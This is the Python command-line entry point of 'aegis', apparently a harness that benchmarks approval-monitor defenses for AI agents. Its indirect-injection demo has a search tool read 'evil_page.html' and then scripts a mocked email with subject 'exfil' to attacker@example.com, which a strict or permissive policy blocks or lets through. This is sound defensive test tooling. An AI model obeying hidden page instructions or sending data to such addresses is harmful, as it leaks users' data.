from __future__ import annotations

import argparse
import json
from pathlib import Path
from typing import Optional

from rich import print

from aegis.bench import bench
from aegis.core.run import new_run
from aegis.defenses.approval_monitor import ApprovalMonitor, Policy
from aegis.eval.metrics import evaluate_run
from aegis.tools.search_local_page import SearchLocalPageTool
from aegis.tools.send_email import SendEmailTool


def _latest_run_dir(out_root: str = "runs") -> Optional[Path]:
    root = Path(out_root)
    if not root.exists():
        return None
    candidates = [p for p in root.iterdir() if p.is_dir()]
    if not candidates:
        return None
    return sorted(candidates)[-1]


def main() -> None:
    parser = argparse.ArgumentParser(prog="aegis")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # --- run ---
    run = sub.add_parser("run", help="Run a scenario in the harness")
    run.add_argument("--scenario", required=True, help="Scenario file name (without extension)")
    run.add_argument("--out", default="runs", help="Output folder for run artifacts")
    run.add_argument("--demo-email", action="store_true", help="Demo: attempt a send_email tool call")
    run.add_argument("--demo-indirect", action="store_true", help="Demo: indirect injection flow (local HTML)")
    run.add_argument(
        "--policy",
        choices=["strict", "permissive"],
        default="strict",
        help="Security policy to apply",
    )

    # --- eval ---
    ev = sub.add_parser("eval", help="Evaluate a run directory (trace.jsonl)")
    ev.add_argument("--run", help="Run ID folder name, e.g. 20260206_210501")
    ev.add_argument("--out", default="runs", help="Runs root folder")
    ev.add_argument("--latest", action="store_true", help="Evaluate the latest run in runs/")

    # --- bench ---
    b = sub.add_parser("bench", help="Run multiple scenarios/policies and write a summary")
    b.add_argument("--out", default="runs", help="Runs root folder")
    b.add_argument("--scenarios", nargs="+", default=["indirect_injection_01"], help="Scenario names (no extension)")
    b.add_argument("--policies", nargs="+", default=["strict", "permissive"], help="Policies to run")

    args = parser.parse_args()

    # =========================
    # RUN
    # =========================
    if args.cmd == "run":
        scenario_path = Path("aegis/scenarios") / f"{args.scenario}.txt"
        if not scenario_path.exists():
            raise SystemExit(f"Scenario not found: {scenario_path}")

        ctx = new_run(args.out)
        scenario_text = scenario_path.read_text(encoding="utf-8")

        ctx.trace.event("scenario_loaded", name=args.scenario, path=str(scenario_path))
        ctx.trace.event("scenario_text", text=scenario_text)

        print("[bold green]AEGIS[/bold green] ✅")
        print(f"Run ID:   [cyan]{ctx.run_id}[/cyan]")
        print(f"Run dir:  [cyan]{ctx.run_dir.resolve()}[/cyan]")
        print(f"Scenario: [cyan]{args.scenario}[/cyan]")
        print(f"Policy:   [cyan]{args.policy}[/cyan]\n")
        print(scenario_text)

        ctx.trace.event("agent_start", mode="demo_no_llm")

        policy = Policy.permissive() if args.policy == "permissive" else Policy.default()
        monitor = ApprovalMonitor(policy=policy)

        if args.demo_email:
            email_tool = SendEmailTool()

            proposed = email_tool.propose(
                to="test@example.com",
                subject="AEGIS demo",
                body="If you see this, the tool ran (mocked).",
            )

            decision = monitor.decide(proposed_call=proposed)
            ctx.trace.event(
                "tool_decision",
                tool_name=proposed.name,
                allowed=decision.allowed,
                reason=decision.reason,
                args=proposed.args,
            )

            if decision.allowed:
                result = email_tool.execute(ctx=ctx, **proposed.args)
                ctx.trace.event("tool_result", tool_name=proposed.name, result=result)
            else:
                ctx.trace.event("tool_blocked", tool_name=proposed.name)

        if args.demo_indirect:
            search_tool = SearchLocalPageTool()
            email_tool = SendEmailTool()

            proposed_search = search_tool.propose(page="evil_page.html")
            ctx.trace.event("tool_proposed", tool_name=proposed_search.name, args=proposed_search.args)

            search_result = search_tool.execute(ctx=ctx, **proposed_search.args)
            ctx.trace.event(
                "tool_result",
                tool_name=proposed_search.name,
                result_meta={"page": search_result["page"]},
            )

            ctx.trace.event(
                "untrusted_content_received",
                source="search_local_page",
                note="HTML may contain hidden instructions",
            )

            proposed_email = email_tool.propose(
                to="attacker@example.com",
                subject="exfil",
                body="(simulated) sensitive data would be placed here",
            )

            decision = monitor.decide(proposed_call=proposed_email)
            ctx.trace.event(
                "tool_decision",
                tool_name=proposed_email.name,
                allowed=decision.allowed,
                reason=decision.reason,
                args=proposed_email.args,
            )

            if decision.allowed:
                result = email_tool.execute(ctx=ctx, **proposed_email.args)
                ctx.trace.event("tool_result", tool_name=proposed_email.name, result=result)
            else:
                ctx.trace.event("tool_blocked", tool_name=proposed_email.name)

        ctx.trace.event("agent_end")
        ctx.trace.event("run_end", run_id=ctx.run_id)
        return

    # =========================
    # EVAL
    # =========================
    if args.cmd == "eval":
        out_root = args.out

        if args.latest:
            run_dir = _latest_run_dir(out_root)
            if run_dir is None:
                raise SystemExit(f"No runs found in: {out_root}")
        else:
            if not args.run:
                raise SystemExit("Provide --run <RUN_ID> or use --latest")
            run_dir = Path(out_root) / args.run

        result = evaluate_run(run_dir)

        metrics_path = Path(run_dir) / "metrics.json"
        metrics_path.write_text(json.dumps(result, indent=2), encoding="utf-8")

        print("[bold green]AEGIS EVAL[/bold green] ✅")
        print(f"Run dir:      [cyan]{run_dir.resolve()}[/cyan]")
        print(f"Events:       [cyan]{result['event_count']}[/cyan]")
        print(f"Metrics file: [cyan]{metrics_path.resolve()}[/cyan]\n")

        m = result["metrics"]
        print("[bold]Attempted:[/bold]", m["attempted"])
        print("[bold]Blocked:  [/bold]", m["blocked"])
        print("[bold]Executed: [/bold]", m["executed"])
        print("[bold]Email executed (mocked):[/bold]", m["email_executed_mocked"])
        return

    # =========================
    # BENCH
    # =========================
    if args.cmd == "bench":
        res = bench(out_root=args.out, scenarios=args.scenarios, policies=args.policies)

        summary_json = res["summary_json"]
        summary_md = res["summary_md"]
        payload = res["payload"]

        print("[bold green]AEGIS BENCH[/bold green] ✅")
        print(f"Summary JSON: [cyan]{Path(summary_json).resolve()}[/cyan]")
        print(f"Summary MD:   [cyan]{Path(summary_md).resolve()}[/cyan]\n")

        # Small readable summary
        for r in payload["results"]:
            print(
                f"- scenario=[cyan]{r['scenario']}[/cyan] "
                f"policy=[cyan]{r['policy']}[/cyan] "
                f"email_executed=[bold]{r['email_executed_mocked']}[/bold] "
                f"blocked={r['blocked']}"
            )
        return

    raise SystemExit("Unknown command")


if __name__ == "__main__":
    main()




